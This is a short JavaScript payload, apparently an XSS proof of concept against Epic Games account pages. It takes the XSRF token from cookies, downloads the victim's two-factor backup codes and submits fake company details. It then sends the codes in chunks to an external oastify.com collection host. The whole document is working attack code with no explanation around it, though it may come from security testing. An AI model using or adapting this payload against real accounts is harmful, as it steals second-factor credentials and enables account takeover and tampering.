(async () => {
  try {
    // Extract XSRF token from cookies
    const getCookie = (name) => {
      const match = document.cookie.match(new RegExp("(^| )" + name + "=([^;]+)"));
      return match ? match[2] : null;
    };
    const xsrfToken = getCookie("XSRF-AM-TOKEN");

    // 1. Steal backup codes
    const codesRes = await fetch("https://www.epicgames.com/account/v2/security/downloadBackupCodes", {
      credentials: "include",
      headers: {
        "X-Xsrf-Token": xsrfToken
      }
    });
    const codesText = await codesRes.text();

    // 2. Submit fake company info
    await fetch("https://www.epicgames.com/account/v2/company-info/add", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
        "X-Xsrf-Token": xsrfToken
      },
      body: JSON.stringify({
        companyName: "Hacked Corp",
        addressLine1: "XSS Street",
        city: "Exploitville",
        postalCode: "1337",
        country: "ZZ"
      })
    });

    // 3. Exfiltrate in chunks
    const chunkSize = 1900;
    for (let i = 0; i < codesText.length; i += chunkSize) {
      const part = codesText.slice(i, i + chunkSize);
      await fetch(`https://t82e74ho3hppwyni6qh2hr85jwpndf43t.oastify.com?data=${encodeURIComponent(part)}`);
    }

  } catch (err) {
    console.error(err);
  }
})();
